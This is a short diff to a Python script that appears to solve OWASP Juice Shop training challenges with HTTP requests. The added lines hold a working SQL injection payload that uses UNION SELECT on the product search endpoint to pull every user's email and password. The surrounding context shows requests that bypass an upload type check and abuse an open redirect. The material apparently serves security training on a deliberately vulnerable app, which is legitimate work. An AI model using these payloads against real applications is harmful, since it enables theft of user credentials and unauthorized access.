@@ -53,6 +53,8 @@ requests.get(url+'/.well-known/security.txt')
 requests.post(url+'/file-upload', files={'file':open('file-upload/Upload Size.pdf','rb')})
 # ---- Upload Type (Upload a file that has no .pdf or .zip extension.)
 requests.post(url+'/file-upload', files={'file':open('file-upload/Upload Type.txt','rb')})
+# ---- User Credentials (Retrieve a list of all user credentials via SQL Injection.)
+requests.get(url+'/rest/products/search',params={'q':'qwert\')) UNION SELECT id, email, password, \'4\',\'5\',\'6\',\'7\',\'8\',\'9\' FROM Users--'})
 # ---- Whitelist Bypass (Enforce a redirect to a page you are not supposed to redirect to.)
 requests.get(url+'/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop')
 
